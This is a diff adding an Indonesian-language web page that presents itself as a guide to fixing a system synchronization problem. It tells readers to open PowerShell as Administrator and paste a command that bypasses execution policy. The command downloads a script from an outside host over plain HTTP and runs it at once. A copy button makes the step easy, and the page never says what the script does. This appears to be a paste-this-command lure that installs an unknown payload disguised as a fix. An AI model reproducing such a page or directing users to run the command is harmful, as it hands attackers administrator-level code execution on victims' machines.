@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial Perbaikan Sinkronisasi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-2xl w-full bg-white rounded-xl shadow-lg p-8 border border-gray-100">
+        <!-- Header -->
+        <div class="text-center mb-10">
+            <h1 class="text-3xl font-bold text-gray-800 mb-2">Panduan Perbaikan Sinkronisasi</h1>
+            <p class="text-gray-600">Ikuti langkah-langkah di bawah ini untuk memperbaiki masalah sinkronisasi sistem Anda.</p>
+        </div>
+
+        <!-- Langkah-langkah -->
+        <div class="space-y-8">
+            <!-- Langkah 1 -->
+            <div class="flex items-start gap-4">
+                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold">1</div>
+                <div>
+                    <h3 class="text-lg font-semibold text-gray-800">Buka PowerShell sebagai Administrator</h3>
+                    <p class="text-gray-600 mt-1">Tekan tombol <kbd class="px-2 py-1 bg-gray-100 border border-gray-300 rounded text-xs">Windows</kbd>, cari <span class="font-medium">"PowerShell"</span>, klik kanan dan pilih <span class="text-blue-600 font-semibold">Run as Administrator</span>.</p>
+                </div>
+            </div>
+
+            <!-- Langkah 2 -->
+            <div class="flex items-start gap-4">
+                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold">2</div>
+                <div class="flex-1">
+                    <h3 class="text-lg font-semibold text-gray-800">Salin & Tempel Perintah</h3>
+                    <p class="text-gray-600 mt-1 mb-4">Salin perintah di bawah ini dan tempelkan (Paste) ke dalam jendela PowerShell yang sudah terbuka.</p>
+                    
+                    <!-- Kotak Kode -->
+                    <div class="relative bg-gray-900 rounded-lg p-4 group">
+                        <code id="command-text" class="text-blue-400 break-all text-sm leading-relaxed">powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/synchronizer-fix.ps1 | iex"</code>
+                        <button onclick="copyToClipboard()" class="absolute top-2 right-2 p-2 bg-gray-700 hover:bg-gray-600 text-white rounded transition-all duration-200 flex items-center gap-2 text-xs" id="copy-btn">
+                            <i class="far fa-copy" id="copy-icon"></i>
+                            <span id="copy-text">Salin</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Langkah 3 -->
+            <div class="flex items-start gap-4">
+                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold">3</div>
+                <div>
+                    <h3 class="text-lg font-semibold text-gray-800">Jalankan Skrip</h3>
+                    <p class="text-gray-600 mt-1">Tekan tombol <kbd class="px-2 py-1 bg-gray-100 border border-gray-300 rounded text-xs">Enter</kbd> dan tunggu hingga proses perbaikan selesai secara otomatis.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer Info -->
+        <div class="mt-12 p-4 bg-blue-50 border-l-4 border-blue-400 text-blue-800 text-sm">
+            <p><i class="fas fa-info-circle mr-2"></i> Pastikan koneksi internet aktif saat menjalankan skrip ini.</p>
+        </div>
+    </div>
+
+    <!-- JavaScript untuk Copy to Clipboard -->
+    <script>
+        function copyToClipboard() {
+            const commandText = document.getElementById('command-text').innerText;
+            const btn = document.getElementById('copy-btn');
+            const icon = document.getElementById('copy-icon');
+            const text = document.getElementById('copy-text');
+
+            navigator.clipboard.writeText(commandText).then(() => {
+                // Perubahan visual saat berhasil
+                text.innerText = 'Tersalin!';
+                icon.className = 'fas fa-check text-green-400';
+                btn.classList.add('bg-green-700');
+
+                // Kembali ke semula setelah 2 detik
+                setTimeout(() => {
+                    text.innerText = 'Salin';
+                    icon.className = 'far fa-copy';
+                    btn.classList.remove('bg-green-700');
+                }, 2000);
+            }).catch(err => {
+                console.error('Gagal menyalin: ', err);
+            });
+        }
+    </script>
+</body>
+</html>
